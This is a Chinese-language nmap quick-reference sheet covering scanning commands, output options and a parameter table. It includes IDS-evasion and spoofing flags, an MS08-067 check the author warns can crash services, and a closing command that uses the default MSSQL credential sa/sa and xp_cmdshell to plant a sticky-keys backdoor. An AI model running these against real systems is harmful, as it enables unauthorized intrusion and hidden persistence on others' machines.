Nmap 手册

  • nmap
  • tools

0x00: 说明

nmap 速查手册, 总结常用用法.


0x01: nmap 功能介绍

- Host discovery
- Port discovery/enumeration
- Service discovery
- Operating system version detection
- Hardware(MAC) address dection
- Service version detection
- Vulunerability/exploit detection, using Nmap scripts (NSE)


0x02: nmap 示例

简单nmap扫描例子, 常用来第一阶段的测试

  • Ping 扫描,列出MAC地址
    nmap -sP 10.0.0.0/24

  • T(4)时间模板, SYN扫描, 全端口扫描, 端口识别(识别服务)
    nmap -p 1-65535 -sV -sS -T4 target

  • 详细输出, T(4)时间模板, SYN扫描, -A 参数包含OS和version探测, 显示tracertroute结果
    nmap -v -sS -A -T4 target

  • 详细输出, T(5)时间模板, SYN扫描, -A 参数包含OS和version探测, 显示tracertroute结果
    nmap -v -sS -A -T5 target

  • 详细输出, T(5)时间模板, SYN扫描, OS和version 探测
    nmap -v -sV -O -sS -T5 target

  • 详细输出, T(4)时间模板, SYN扫描, OS和version 探测, 全端口扫描
    nmap -v -p 1-65535 -sV -O -sS -T4 target

  • 详细输出, T(5)时间模板, SYN扫描, OS和version 探测, 全端口扫描
    nmap -v -p 1-65535 -sV -O -sS -T5 target


    攻击性扫描时间越快, 可能会导致错误的结果 !
    T5 使用了非常快的攻击性扫描时间, 并且可能会导致端口扫描结果不准确, 如果你需要快速扫描的话, T4 是一个折中的解决办法, 我经常使用T3来扫描.


从文件读取需要扫描的 IP列表

  • nmap -iL ip-addresses.txt


Nmap 输出格式

  • 扫描的结果输出到屏幕, 同时会存储一份到grep-output.txt
    nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24

  • 标准输出, 直接写入指定的文件
    nmap -sS -A -v -T3 -Pn -oN /tmp/output.txt --script=vuln target


Nmap 扫描 Netbios 例子

  • 在子网中发现开放netbios的IP
    nmap -sV -v -p 139,445 10.0.0.1/24

  • UDP方式扫描子网中开放的 137 端口, 并用脚本探测 Netbios name 和 Netbios mac
    sudo nmap -sU --script nbstat.nse -p 137 --open 10.0.0.0/24

  • 扫描目标是否存在 MS08-067 漏洞, 或指定漏洞
    nmap --script-args=unsafe=1 --script smb-vuln-ms08-067.nse -p 445 target

    --script-args=unsafe=1 有可能使服务器或服务崩溃

Nmap Nikto 扫描

  • 扫描子网中的 http 服务器, 并通过管道让 nikto 去扫描
    nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -

  • 扫描子网中的 http, https 服务器, 并通过管道让 nikto 去扫描
    nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -


0x03: nmap 参数详解

Nmap 支持 主机名, IP, 网段 表示形式

  • wooyun.org, wooyun.org/24, 192.168.0.1, 10.0.0-255.1-254

Command Description
-iL filename 从文件中读取待检测的目标,文件中的表示方法支持主机名,ip,网段
-iR num_hosts 选择随机的互联网主机来扫描
--exclude host1[, host2] 从扫描任务中需要排除的主机
--exculdefile exclude_file 排除文件中的IP, 格式和-iL指定扫描文件的格式相同


主机发现
Command Description
-sL 列表中列出扫描的目标, 不进行扫描
-sn Ping 扫描, 用来发现存活主机
-Pn 不检测主机存活
-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping/SCTP Ping 发现
-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机
-PO [prococol list] 使用IP协议包探测对方主机是否开启
-n/-R 对IP进行域名反向解析/为所有的IP都进行域名的反响解析


扫描技巧
Command Description
-sS TCP SYN scan
-sT Connect scan
-sA ACK scan
-sW Window scan
-sM Maimon scan
-sU UDP Scan
-sN TCP Null scan
-sF FIN scan
-sX Xmas scan
--scanflags Customize TCP scan flags
-sI zombie host[:probeport] Idle scan
-sY SCTP INIT scan
-sZ COOKIE-ECHO scan
-sO IP protocol scan
-b “FTP relay host” FTP bounce scan


指定端口和扫描顺序
Command Description
-p 指定端口, 例 -p80,443 or -p1-65535
-p U:PORT 扫描UDP端口, 例 -p U:53
-F Fast mode, 只扫描最常用的少数端口
-r 不随机扫描端口,默认是随机扫描的
–top-ports “number” 扫描开放概率最高的 number 个端口, 默认扫前1000个
–port-ratio “ratio” 扫描指定频率以上的端口


服务版本识别
Command Description
-sV 探测开放端口的服务及版本信息
--version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别,默认是7.
--version-light 打开轻量级模式,为--version-intensity 2 的别名
--version-all 尝试所有探测,为--version-intensity 9 的别名
--version-trace 显示出详细的版本侦测过程信息


脚本扫描
Command Description
-sC 根据端口识别的服务,调用默认脚本
--script=”Lua scripts” 调用脚本名称
--script-args=n1=v1,[n2=v2] 调用的脚本传递的参数
--script-args-file=filename 使用文件传递参数
--script-trace 显示所有发送和接收的数据
--script-updatedb 更新脚本数据库
--script-help=”Lua scripts” 查看指定脚本的帮助
  • Archlinux 中 nmap 脚本目录
    /usr/share/nmap/scripts/

    OS 识别
Command Description
-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测
--osscan-limit 针对指定的目标进行操作系统检测
--osscan-guess 推测操作系统检测结果, Nmap默认进行这种匹配


时间和性能
Command Description
-T 0-5 Set timing template - higher is faster (less accurate)
--host-timeout TIME Give up on target after this long
--scan-delay TIME
--max-scan-delay TIME		 Adjust delay between probes


防火墙/IDS躲避和哄骗
Command Description
-f; --mtu VALUE 指定使用分片、指定数据包的MTU.
-D decoy1,decoy2,ME 使用诱饵隐蔽扫描
-S IP-ADDRESS 源地址欺骗
-e INTERFACE 使用指定的接口
-g PORTNUM
--source-port PORTNUM		 使用指定源端口
--proxies url1,[url2],… 使用 HTTP/SOCKS4 代理
--data-length NUM 填充随机数据让数据包长度达到NUM
--ip-options OPTIONS 使用指定的IP选项来发送数据包
--ttl VALUE 设置IP time-to-live 字段
--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装
--badsum 使用错误的checksum来发送数据包


Nmap 输出选项
Command Description
-v 提高输出信息的详细度
-d level 设置debug级别,最高是9
-oN 将标准输出直接写入指定的文件
-oX 输出xml文件
-oS 转换为Leet语(骇客语)
-oG 输出便于通过bash或者perl处理的格式,非xml
-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出
--reason 显示端口处于特定状态的原因
--open 只输出端口状态为open的端口
--packet-trace 显示所有发送或者接收到的数据包
--iflist 显示路由信息和接口,便于调试
--log-errors 把日志等级为errors/warings的日志输出
--resume FILENAME 恢复已停止的扫描
(之前用-oG输出到文件的时候被异常中止的话可以使用resume参数来恢复)
--stylesheet PATH/URL 设置XSL样式表，转换XML输出


Nmap 其它选项
Command Description
-6 开启IPv6
-A OS识别,版本探测,脚本扫描和traceroute
-V 打印版本信息
-h 输出帮助


0x04: Nmap 总结常用参数

common use
  • 扫描常见漏洞, OS识别, 版本探测

  • nmap -sS -A -v -T3 -Pn –script=vuln Target

  • 利用mssql弱口令, 直接加后门, 避免暴露.
    nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”copy c:\WINDOWS\explorer.exe c:\WINDOWS\system32\sethc.exe /y” target
